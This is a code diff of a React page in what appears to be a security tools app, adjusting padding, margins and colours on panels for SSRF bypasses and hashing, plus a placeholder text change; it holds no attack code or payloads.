           {/* Right: SSRF & Cloud Metadata */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, overflowY: "auto" }}>
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18, overflowY: "auto" }}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                 Cloud Metadata & SSRF Bypasses
               </h2>
               <span style={{ fontSize: 11, color: "var(--fg-3)" }}>IMDSv1, GCP, Azure & filter evasions</span>
@@ -955,7 +1029,7 @@ export default function ToolsPage() {
                   </div>
                   <div style={{
                     padding: "6px 8px",
-                    background: "rgba(0,0,0,0.4)",
+                    background: "rgba(0,0,0,0.3)",
                     border: "1px solid var(--border)",
                     borderRadius: 4,
                     fontFamily: "var(--font-mono)",
@@ -979,9 +1053,9 @@ export default function ToolsPage() {
       {activeTab === "hasher" && (
         <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
           {/* Left: Hash Identifier */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14 }}>
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                 Hash Algorithm Identifier
               </h2>
               <span style={{ fontSize: 11, color: "var(--fg-3)" }}>Heuristic pattern analysis</span>
@@ -1042,9 +1116,9 @@ export default function ToolsPage() {
           </div>
 
           {/* Right: Instant Multi-Hasher */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14 }}>
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                 Instant Cryptographic Hasher
               </h2>
               <span style={{ fontSize: 11, color: "var(--fg-3)" }}>Client-side WebCrypto API</span>
@@ -1068,7 +1142,7 @@ export default function ToolsPage() {
                   fontSize: 12.5,
                   fontFamily: "var(--font-mono)"
                 }}
-                placeholder="Enter string to hash..."
+                placeholder="Enter string to hash (e.g. admin, password)..."
               />
             </div>
 
